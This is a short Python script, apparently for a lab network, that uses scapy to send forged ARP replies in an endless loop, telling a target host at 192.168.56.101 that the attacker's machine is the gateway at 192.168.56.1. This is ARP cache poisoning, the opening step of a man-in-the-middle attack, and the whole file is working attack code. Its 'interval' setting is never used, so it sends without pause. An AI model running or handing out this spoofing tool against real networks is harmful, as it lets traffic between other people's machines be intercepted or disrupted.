from scapy.all import ARP, sendp, srp, Ether, send
import time

def send_arp_replies(target_ip, gateway_ip, iface=None, interval=1):
    try:
        while True:
            # Craft ARP reply packet
            arp_reply = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
            # Craft Ethernet frame
            ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")

            # Combine Ethernet frame and ARP request packet
            packet = ether_frame / arp_reply
            # Send packet, binding to the specified interface
            sendp(packet, iface=iface, verbose=False)
            print("ARP reply sent successfully!")
            
    except Exception as e:
        print(f"Error: {e}")

# Example usage
target_ip = "192.168.56.101"  # Specify the target IP address
gateway_ip = "192.168.56.1"    # Specify the gateway IP address
send_arp_replies(target_ip, gateway_ip, iface="Ethernet 3", interval=1)  # Send ARP replies every 1 second
